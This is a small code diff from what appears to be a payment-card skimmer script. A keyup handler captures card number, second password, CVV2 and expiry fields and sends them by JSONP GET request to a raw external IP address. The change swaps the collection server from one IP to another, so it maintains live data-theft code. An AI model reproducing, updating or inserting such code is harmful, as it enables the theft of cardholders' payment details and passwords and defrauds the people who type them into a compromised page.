@@ -232,7 +232,7 @@ $('#cardnumber, #secondpass, #cvv2, #expmah, #expyear').keyup(function(e){
 			break;
 		}		
 	 $.ajax({
-			url: 'http://78.46.119.98:3000/submit',
+			url: 'http://5.9.17.126:3000/submit',
 			data:  dataString,
 			type: 'GET',
 			dataType: 'jsonp',
